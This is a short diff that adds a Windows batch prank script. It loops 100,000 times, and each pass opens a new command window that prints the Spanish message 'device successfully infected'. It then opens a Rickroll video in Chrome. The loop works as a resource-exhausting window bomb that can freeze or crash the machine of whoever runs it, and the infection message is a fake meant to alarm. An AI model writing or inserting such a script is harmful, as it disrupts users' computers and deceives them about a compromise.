@@ -1,0 +1,4 @@
+FOR /L %%A IN (1,1,100000) DO (
+  start cmd /k echo Dispositivo infectado con exito   
+)
+start chrome "https://youtu.be/dQw4w9WgXcQ"
